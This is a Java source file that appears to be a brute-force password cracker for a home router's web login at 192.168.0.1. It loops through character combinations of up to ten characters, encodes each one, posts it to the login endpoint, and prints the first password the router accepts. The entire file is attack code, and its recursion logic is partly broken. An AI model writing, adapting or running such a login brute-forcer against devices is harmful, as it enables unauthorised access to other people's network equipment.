import org.apache.http.HttpEntity;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import javax.sound.midi.Soundbank;
import java.io.Console;
import java.io.IOException;

public class Http {
    public static boolean dopost(String password) throws IOException {
        CloseableHttpClient httpclient = HttpClients.createDefault();
        try {
            String uri = "http://192.168.0.1/login/Auth";
            HttpPost httppost = new HttpPost(uri);
            StringBody password1 = new StringBody(password, ContentType.TEXT_PLAIN);
            HttpEntity reqEntity = MultipartEntityBuilder.create()
                    .addPart("user", password1)
                    .build();
            httppost.setEntity(reqEntity);
            CloseableHttpResponse response = httpclient.execute(httppost);
            try {
                String s = response.getStatusLine().toString();

                if (s.equals("HTTP/1.0 302 Redirect")) {
                    return false;
                } else {
                    return true;
                }
            } finally {
                response.close();
            }
        } catch (ClientProtocolException e) {
            return false;
        } catch (IOException e) {
            return false;
        } finally {
            httpclient.close();
        }
    }

    public static void main(String[] args) throws IOException {


        int[] source = {0,1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35};
        int[] result = null;
        for (int i = 1; i <= 10; i++) {
            result = new int[i];
            int sourceCount = source.length;
            int resultCount = result.length;
            String s = combine(source, sourceCount, resultCount, result, resultCount);
            if (s != null){
                System.out.println(s);
                break;
            }
        }


    }

    static String s = "qwertyuiopasdfghjklzxcvbnm1234567890";
    static char[] chars = s.toCharArray();


    static String combine(int[] a, int n, int m, int[] b, int M) throws IOException {
        for (int i = n; i >= m; i--)//注意这里的循环范围
        {
            b[m - 1] = i - 1;
            if (m > 1)
                combine(a, i - 1, m - 1, b, M);
            else {
                String s = "";
                for (int j = M - 1; j >= 0; j--) {
                    char c = chars[a[b[j]]];
                    s += c;
                }

                boolean dopost = dopost(Encode.encode(s));
                if (dopost) {
                   return s;
                }
            }
        }
        return null;
    }


}
